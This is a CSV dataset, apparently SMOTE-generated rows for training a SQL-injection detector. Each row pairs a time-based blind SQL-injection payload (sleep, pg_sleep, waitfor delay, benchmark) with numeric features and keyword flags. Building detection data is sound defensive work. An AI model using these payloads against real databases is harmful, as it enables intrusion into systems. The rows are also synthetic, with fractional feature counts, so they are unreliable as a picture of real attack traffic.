id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000562,0.3239917216366188,94.34711855602814,20.110536726832162,3.0279271905989047,22.0,10.0,47.78926546335677,14.557853092671355,0.23504637646764315,0.10683926203074688,0.503912275405197,0.15420208609641287,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,7.557853092671355,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000012,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000210,0.15985250400114628,84.08329129678839,28.166582593576777,3.7562908359866563,30.333165187153554,10.0,32.83341740642322,10.916708703211611,0.3607124841480738,0.11893096457032439,0.39051238786352016,0.12984416341808167,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,1.9167087032116117,0.0,4.0,0.0,1.0,0.0,1.9167087032116115,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000013,attack,time,"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000570,0.34748411206997565,87.83728099639326,25.837280996393257,3.743376199316982,22.0,27.0,30.0,8.837280996393256,0.25046758334369756,0.3073920341036288,0.3415467045595875,0.1005936779930861,0.8372809963932564,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.8372809963932563,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000014,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000223,0.18090362397173457,42.92406789503432,19.92406789503432,3.4610345719725157,11.999999999999998,4.0,17.0,9.92406789503432,0.27957429970076864,0.09319143323358954,0.3960635912427556,0.23117067582288622,2.0,0.9240678950343191,2.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,3.0,0.0,0.0,0.0,2.0,1.0,0.9240678950343191,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,time,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000329,0.29998690074143036,100.50462623983094,27.126156559957735,3.367686877166402,33.0,10.0,45.50462623983094,12.0,0.3283987821236134,0.09951478246170103,0.4526686964606444,0.11941773895404122,0.0,0.8738434400422654,0.0,0.0,1.0,1.0,0.0,8.126156559957735,0.0,0.0,0.0,2.0,0.0,0.8738434400422654,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000016,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,nearest_attack_euclidean,R000408,0.019069341020961722,112.77949127350493,24.970598836467325,3.2964864154722235,44.9264970911683,1.9852994182336614,50.89709592763563,14.970598836467323,0.39837611197347816,0.0175889336927392,0.451292918988087,0.13274203534569567,3.985299418233662,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.985299418233662,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000017,attack,time,1'   )    )     )   or sleep  (  5  )  #,nearest_attack_euclidean,R000504,0.7065205078693638,38.62322478069581,13.344193804826048,2.4105330483972507,7.0,2.0,22.623224780695807,7.0,0.18169265731606205,0.05191218780458916,0.5847024975632867,0.18169265731606205,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,4.655806195173952,0.3441938048260479,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000018,attack,time,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,nearest_attack_euclidean,R000092,0.5215349894932315,128.4215471764908,25.0,2.957693025350443,38.0,2.0,69.33723774119264,19.08430943529816,0.29634948391059046,0.015597341258452135,0.5395244009838495,0.14852877384710797,4.0,0.0,0.0,0.0,1.0,1.0,0.0,13.084309435298161,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000019,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000579,0.5773829288747692,82.4451190513426,27.0,3.528601914555207,22.0,10.0,36.55609524107408,13.88902381026852,0.26780410560467116,0.12172913891121415,0.44211633160103037,0.1683504238830843,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.889023810268521,2.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000020,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000130,1.4901871552631656,94.88718698316902,27.0,3.461352135586474,21.45512703387984,17.162822152568225,42.10641564415273,14.162822152568223,0.23451789816660618,0.18004344677936288,0.43770676574580863,0.14773188930822231,0.0,3.308974593224032,0.0,0.0,-2.7755575615628914e-17,1.3089745932240322,0.0,7.235898372896128,1.3089745932240322,0.0,1.0,1.3089745932240322,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.6910254067759679,0.0,0.0,0.0,1.3089745932240322,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000021,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'kerg' like 'kerg,nearest_attack_euclidean,R000427,0.2658937362516819,100.37511609762944,23.33930229966135,3.236661120083828,40.0,1.0,46.0358137979681,13.33930229966135,0.3989305496690789,0.009973263741726981,0.4582123074737782,0.13288387911541588,3.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.33930229966135,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000022,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,0.13323812323426915,56.0,18.217509313232362,3.1600513858254957,22.0,1.0,25.0,8.0,0.39285714285714285,0.017857142857142863,0.44642857142857145,0.14285714285714285,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000023,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'brob'  =  'brob,nearest_attack_euclidean,R000426,0.018714543173367678,109.0,24.0,3.1658962908250343,38.0,2.0,53.0,16.0,0.3486238532110092,0.018348623853210996,0.48623853211009177,0.14678899082568808,4.0,0.0,0.0,0.0,1.0,1.0,0.0,10.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000024,attack,time,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000768,0.680394038882121,77.9456527099833,29.78381636555741,4.040483152698773,33.0,10.0,24.297101806655537,10.648550903327768,0.4242714335248531,0.1285671010681373,0.3109643537114868,0.13619711169552282,3.2161836344425896,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.2161836344425896,0.0,0.0,0.0,3.432367268885179,1.0,0.0,0.0,0.7838163655574105,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000025,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000660,0.11844578619792169,94.37336442514945,25.0,3.4320305689565336,40.34334110628737,1.0686682212574716,40.7553504338322,12.206004663772417,0.4279185598894992,0.011229686949452422,0.4315646601332588,0.12928709302778965,3.0686682212574725,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.137336442514945,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000026,attack,time,"1""  )   where 6843  =  6843 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000363,0.4885488522468004,95.4466475855309,28.566997137829635,3.667871816170924,27.13399427565927,18.0,39.26798855131854,11.04466475855309,0.2841086802664758,0.19069583680229063,0.40930416319770935,0.1158913197335242,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.04466475855309,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000027,attack,time,1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,nearest_attack_euclidean,R000598,1.091641150409793,55.63811516330122,23.0,3.875474456174015,25.552460653204893,4.0,15.723769673397555,10.361884836698778,0.45899632700335746,0.07189855173597243,0.2827790176171249,0.18632610364354524,6.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.3618848366987768,0.0,2.0,0.0,0.0,0.0,0.3618848366987768,1.0,0.0,0.0,0.0,0.0,0.3618848366987768,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000028,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000591,1.3229961643941208,54.89393099931563,19.053034500342186,3.1598343698797025,19.893930999315632,1.526517250171092,24.946965499657814,8.526517250171093,0.36156490730752966,0.02817529038743352,0.4543974933791093,0.15586230892592756,0.0,3.5265172501710924,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.4734827498289078,0.0,0.0,0.0,1.0,0.5265172501710922,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000029,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000148,0.863397108040935,126.02674922408315,28.97325077591685,3.4620537787211743,44.02674922408315,10.0,56.0,16.0,0.3493035235511696,0.07935322883522322,0.44437808147725,0.12696516613635714,2.0,0.0,0.0,0.0,1.0,1.0,0.0,10.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.48662538795842525,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.4866253879584255
SMOTE_000030,attack,time,"1%""   )    )     )   and sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000702,0.46058235475804704,72.48600492473503,15.729007387102534,2.400090775600125,11.486004924735024,2.0,44.0,15.0,0.15834202335000686,0.02759534349672109,0.6070975569278639,0.20696507622540816,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,8.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7569975376324884,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7569975376324884
SMOTE_000031,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,nearest_attack_euclidean,R000178,0.5312681584539385,98.80603904709837,23.0,3.1414359166272128,31.0,2.0,48.95791450937513,16.84812453772324,0.31740465338596663,0.020477719573288172,0.491669897503477,0.17044772953726817,0.0,4.0,0.0,0.0,1.0,1.0,0.0,8.84812453772324,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
